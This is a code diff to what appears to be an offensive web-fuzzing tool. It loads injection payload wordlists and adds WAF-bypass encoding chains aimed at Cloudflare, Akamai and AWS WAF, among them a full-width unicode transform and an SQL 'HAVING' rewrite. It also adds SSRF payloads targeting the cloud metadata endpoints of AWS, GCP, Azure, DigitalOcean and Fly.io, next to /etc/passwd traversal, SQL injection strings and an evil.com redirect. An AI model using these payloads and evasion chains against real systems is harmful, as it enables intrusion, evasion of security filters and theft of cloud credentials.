@@ -7,22 +7,24 @@ import uuid
 import urllib.parse
 from typing import Callable, Iterator, List, Optional
 
+from core.paths import DATA_DIR
+
 def load_corpus() -> dict[str, list[str]]:
     corpus: dict[str, list[str]] = {}
-    base_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data", "wordlists")
+    base_dir = DATA_DIR / "wordlists"
     
-    if not os.path.exists(base_dir): return {}
+    if not base_dir.exists(): return {}
 
     categories = ["sqli", "xss", "ssti", "ssrf", "xxe", "idor", "deserial"]
     for category in categories:
-        cat_dir = os.path.join(base_dir, category)
-        if not os.path.exists(cat_dir): continue
+        cat_dir = base_dir / category
+        if not cat_dir.exists(): continue
             
         corpus[category] = []
         for filename in os.listdir(cat_dir):
             if filename.endswith(".txt"):
                 try:
-                    with open(os.path.join(cat_dir, filename), "r", encoding="utf-8") as f:
+                    with open(cat_dir / filename, "r", encoding="utf-8") as f:
                         corpus[category].extend([l.strip() for l in f if l.strip() and not l.startswith("#")])
                 except: continue
     return corpus
@@ -40,17 +42,27 @@ _TRANSFORMS: list[tuple[str, Callable[[str], str]]] = [
     ("comment_inject", lambda s: re.sub(r"\s+", "/**/", s)),
     ("hex_encode", lambda s: "".join(f"%{ord(c):02x}" for c in s)),
     ("tab_newline", lambda s: s.replace(" ", "\t").replace("\n", "%0a")),
+    ("unicode_full_width", lambda s: "".join(chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c for c in s)),
+    ("having_clause", lambda s: s.replace("OR 1=1", "GROUP BY 1 HAVING 1=1")),
 ]
 
 _TRANSFORM_MAP = dict(_TRANSFORMS)
 _WAF_CHAINS: dict[str, list[str]] = {
     "Cloudflare": ["url_encode", "case_shuffle", "unicode_escape", "comment_inject"],
-    "Akamai": ["double_url_encode", "unicode_escape", "null_byte", "tab_newline"],
-    "AWS WAF": ["url_encode", "double_url_encode", "hex_encode", "comment_inject"],
+    "Akamai": ["double_url_encode", "unicode_escape", "null_byte", "tab_newline", "unicode_full_width"],
+    "AWS WAF": ["url_encode", "double_url_encode", "hex_encode", "comment_inject", "having_clause"],
 }
 
 _CONTEXT_PATTERNS = {
-    "url": (["url", "redirect", "next", "return", "callback"], ["http://127.0.0.1/", "//evil.com"]),
+    "url": (["url", "redirect", "next", "return", "callback"], [
+        "http://127.0.0.1/", 
+        "//evil.com",
+        "http://169.254.169.254/latest/meta-data/", # AWS
+        "http://metadata.google.internal/computeMetadata/v1/", # GCP
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01", # Azure
+        "http://169.254.169.254/metadata/v1.json", # DigitalOcean
+        "http://169.254.169.254/v1/instance", # Fly.io
+    ]),
     "path": (["path", "file", "dir", "folder"], ["../../../etc/passwd", "file:///etc/passwd"]),
     "id": (["id", "user", "num", "count"], ["' OR '1'='1", "' OR 1=1--", "1 AND 1=1"]),
 }
